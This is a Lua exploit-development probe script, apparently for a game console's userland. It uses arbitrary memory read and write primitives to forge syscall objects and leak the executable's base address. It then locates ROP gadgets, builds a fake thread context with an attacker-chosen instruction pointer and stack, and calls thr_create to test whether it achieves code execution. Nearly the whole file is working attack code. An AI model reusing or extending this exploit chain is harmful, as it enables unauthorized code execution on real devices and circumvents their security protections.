-- CRASH_CLASS: LOW
-- PROBE 531o: thr_create using ONLY memory.alloc() — exactly like 156d
--
-- 531n died during thr_create. 156d succeeded. Key diff: stack allocation.
-- 156d used memory.alloc() for everything. Let's try that.

print("=== PROBE 531o: THR HEAP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local ebn = eb_hi * 0x100000000 + eb_lo
local eb = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eb=%s", hexq(eb)))

-- Gadgets
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret = eb + uint64(0x42)

-- Verify gadget
local g = rd(ebn + 0x92C67)
if g then
    local gn = g; if gn < 0 then gn = gn + 0x100000000 end
    print(string.format("  gadget=0x%08X (expect 0xC3078948)", gn))
end

-- ALL allocations from memory.alloc (heap)
local shared = memory.alloc(0x100)
wq(N(shared), uint64(0))

-- Stack: allocate a big heap buffer
-- memory.alloc might not support 2MB, let's try 64KB
local stack_buf = memory.alloc(0x10000)  -- 64KB
local stack_n = N(stack_buf)
-- Zero the top area
for off = 0xFF00, 0xFFF8, 8 do
    wq(stack_n + off, bare_ret)
end
local rsp_val = stack_n + 0xFF00

print(string.format("  shared=0x%X stack=0x%X rsp=0x%X", N(shared), stack_n, rsp_val))

-- Build context
local ctx = memory.alloc(0x500)
for off = 0, 0x4BF, 8 do wq(N(ctx) + off, uint64(0)) end

-- Gates
wd(N(ctx) + 0x108, 0x480)
wd(N(ctx) + 0x0D0, 0)
wd(N(ctx) + 0x110, 0x10000)

-- Segments
wd(N(ctx) + 0x0C0, 0x43)
wd(N(ctx) + 0x100, 0x3B)

-- RFLAGS
wq(N(ctx) + 0x0F0, uint64(0x202))

-- RIP = mov [rdi], rax; ret
wq(N(ctx) + 0x0E0, mov_rdi_rax_ret)
-- RSP
wq(N(ctx) + 0x0F8, uint64(rsp_val))

-- GPRs
wq(N(ctx) + 0x048, uint64(N(shared)))               -- RDI
wq(N(ctx) + 0x078, uint64("0xDEADBEEFCAFE"))         -- RAX

-- Print context summary
print(string.format("  rip=%s", hexq(rq(N(ctx) + 0x0E0))))
print(string.format("  rsp=%s", hexq(rq(N(ctx) + 0x0F8))))

-- Spawn
print("[thr_create]")
local tid_out = memory.alloc(8)
wq(N(tid_out), uint64(0))
local ok_tc, rv_tc = pcall(function()
    return mk(430)(uint64(N(ctx)), uint64(N(tid_out)), uint64(0))
end)
local rv_n = -999
if ok_tc and rv_tc then rv_n = N(rv_tc) end
print(string.format("  rv=%d tid=%s", rv_n, hexq(rq(N(tid_out)))))

-- Wait
local dummy = 0
for i = 1, 2000000 do dummy = dummy + 1 end

-- Check
local result = rq(N(shared))
print(string.format("  marker=%s", hexq(result)))
if N(result) ~= 0 then
    print("  SUCCESS!")
else
    print("  FAILED")
    -- thr_kill
    local tid = rq(N(tid_out))
    if tid and N(tid) ~= 0 then
        local ok_k, rv_k = pcall(function()
            return mk(433)(uint64(N(tid)), uint64(0))
        end)
        print(string.format("  thr_kill=%s", ok_k and hexq(rv_k) or "FAIL"))
    end
end

print("=== 531o DONE ===")
